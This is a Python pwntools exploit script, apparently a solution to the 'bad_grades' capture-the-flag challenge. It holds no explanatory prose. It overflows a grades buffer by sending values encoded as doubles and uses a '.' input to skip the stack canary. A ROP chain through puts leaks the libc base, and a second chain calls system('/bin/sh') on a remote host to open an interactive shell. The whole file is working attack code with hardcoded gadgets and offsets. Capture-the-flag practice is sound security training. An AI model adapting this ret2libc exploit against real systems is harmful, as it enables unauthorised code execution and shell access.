#!/usr/bin/env python3

from pwn import *
import struct
import decimal

exe = ELF("./bad_grades_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process(['strace', '-o', 'strace.out', exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("167.99.85.216", 31932)

    return r

def p64_to_double_string(data):
    a = struct.unpack('d', data);
    return bytes(str(decimal.Decimal.from_float(a[0])), 'ascii')


def leak_libc(r):
    r.recvuntil("> ")
    r.sendline('2')

    pop_rdi_ret_gadget = p64(0x0000000000401263);
    ret_gadget = p64(0x0000000000400666);
    puts_got = p64(0x601fa8);
    puts_plt = p64(0x400680);
    main_addr = p64(0x00401108);
    r.sendline('39'); # 33th is canary, 34 is empty, 5 more => 39

    for i in range(0,33):
        r.recvuntil(":");
        r.sendline('1');

    # Send EOF to bypass canary
    r.send(b".\n");
    r.recvuntil(":");

    r.sendline('1');
    r.recvuntil(":");


    r.sendline(p64_to_double_string(pop_rdi_ret_gadget));
    r.recvuntil(":");
    r.sendline(p64_to_double_string(puts_got));
    r.recvuntil(":");
    r.sendline(p64_to_double_string(puts_plt));
    r.recvuntil(":");
    r.sendline(p64_to_double_string(main_addr));
    print(r.recvuntil('\n'))

    data = r.recv(7).strip();
    print("Got data: "+str(data) + " with len "+str(len(data)));
    data = u64(data[-6:].ljust(8, b"\x00"));
    print("Leaked: "+hex(data));
    r.recv(1024)
    puts_libc_offset = 0x80aa0

    libc_base = data - puts_libc_offset
    return libc_base


def main():
    r = conn()

    libc_base = leak_libc(r)

    # This will be once we know libc base
    pop_rdi_ret_gadget = p64(0x0000000000401263);
    bin_sh_str = p64(libc_base + 0x1b3e1a)
    system_ptr = p64(libc_base + 0x4f550)
    ret_gadget = p64(0x0000000000400666);

    # r.recv(1024)
    r.sendline('2')

    r.sendline('39'); # 33th is canary, 34 is empty, 5 more => 39

    for i in range(0,33):
        r.recvuntil(":");
        r.sendline('1');

    # Send EOF to bypass canary
    r.send(b".\n");
    r.recv(1024);

    r.sendline('1');
    r.recv(1024);


    r.sendline(p64_to_double_string(pop_rdi_ret_gadget));
    r.recv(1024)
    r.sendline(p64_to_double_string(bin_sh_str));
    r.recv(1024)
    r.sendline(p64_to_double_string(ret_gadget));
    r.recv(1024)
    r.sendline(p64_to_double_string(system_ptr))

    r.interactive()


if __name__ == "__main__":
    main()